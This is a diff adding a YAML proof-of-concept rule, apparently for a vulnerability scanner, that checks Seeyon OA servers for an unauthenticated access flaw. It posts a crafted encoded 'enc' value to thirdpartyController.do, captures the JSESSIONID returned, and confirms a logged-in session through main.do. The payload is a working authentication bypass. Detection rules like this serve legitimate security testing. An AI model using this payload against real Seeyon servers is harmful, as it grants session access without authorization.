@@ -1,0 +1,19 @@
+name: poc-yaml-seeyon-unauthoried
+rules:
+  - method: POST
+    path: "/seeyon/thirdpartyController.do"
+    expression: "true"
+    body: |
+      method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4
+    search: >-
+      JSESSIONID=(?P<session>.+?)
+  - method: GET
+    path: "/seeyon/main.do"
+    headers:
+      Cookie: JSESSIONID={{session}}
+    expression: |
+      response.status == 200 && response.body.bcontains(b"当前已登录了一个用户，同一窗口中不能登录多个用户")
+detail:
+  author: whami-root(https://github.com/whami-root)
+  links:
+    - https://github.com/whami-root
